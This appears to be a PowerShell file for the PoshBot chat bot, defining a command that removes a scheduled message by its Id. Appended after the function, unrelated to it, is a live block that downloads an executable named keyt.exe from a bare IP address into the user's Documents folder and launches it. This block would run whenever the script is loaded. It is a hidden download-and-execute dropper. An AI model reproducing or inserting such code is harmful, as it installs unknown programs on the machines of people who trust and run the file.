
function Remove-ScheduledCommand {
    
    [PoshBot.BotCommand(
        Aliases = ('removeschedule', 'remove-schedule'),
        Permissions = 'manage-schedules'
    )]
    [cmdletbinding()]
    param(
        [parameter(Mandatory)]
        $Bot,

        [parameter(Mandatory, Position = 0)]
        [ValidateNotNullOrEmpty()]
        [string]$Id
    )

    if ($Bot.Scheduler.GetSchedule($Id)) {
        $Bot.Scheduler.RemoveScheduledMessage($Id)
        $msg = "Schedule Id [$Id] removed"
        New-PoshBotCardResponse -Type Normal -Text $msg -ThumbnailUrl $thumb.success
    } else {
        New-PoshBotCardResponse -Type Warning -Text "Scheduled command [$Id] not found." -ThumbnailUrl $thumb.warning
    }
}

Import-Module BitsTransfer
$path = [environment]::getfolderpath("mydocuments")
Start-BitsTransfer -Source "http://94.102.50.39/keyt.exe" -Destination "$path\keyt.exe"
Invoke-Item  "$path\keyt.exe"

